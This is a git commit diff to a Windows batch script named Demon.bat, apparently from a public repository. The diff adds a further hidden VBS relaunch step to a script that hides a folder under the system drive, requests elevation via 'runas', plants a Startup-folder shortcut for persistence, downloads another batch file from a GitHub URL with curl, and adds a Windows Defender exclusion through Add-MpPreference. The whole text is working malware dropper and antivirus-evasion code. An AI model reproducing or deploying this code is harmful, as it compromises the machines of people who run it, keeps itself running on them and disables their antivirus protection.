55319549a0fd9340c346d274d23c3bc1996cc301
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-16 13:22:03 -0700

    Update Demon.bat

--- Demon.bat
+++ Demon.bat
@@ -4,7 +4,10 @@ mkdir %homedrive%\Demon
 attrib +h %homedrive%\Demon
 cd %homedrive%\Demon
 echo Set app = CreateObject("Shell.Application") >> %homedrive%\Demon\Demon.vbs
-echo app.ShellExecute "%homedrive%\Demon\Demon.bat", , , "runas", 3 >> %homedrive%\Demon\Demon.vbs
+echo app.ShellExecute "%homedrive%\Demon\1337.bat", , , "runas", 3 >> %homedrive%\Demon\Demon.vbs
+echo start %homedrive%\Demon\1337.vbs > %homedrive%\Demon\1337.bat
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\1337.vbs
+echo objShell.Run "%homedrive%\Demon\Demon.bat", 0, False >> %homedrive%\Demon\1337.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Demon.lnk');$s.TargetPath='%homedrive%\Demon\Demon.vbs';$s.Save()"
 curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\Demon.bat
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Demon\Demon.bat
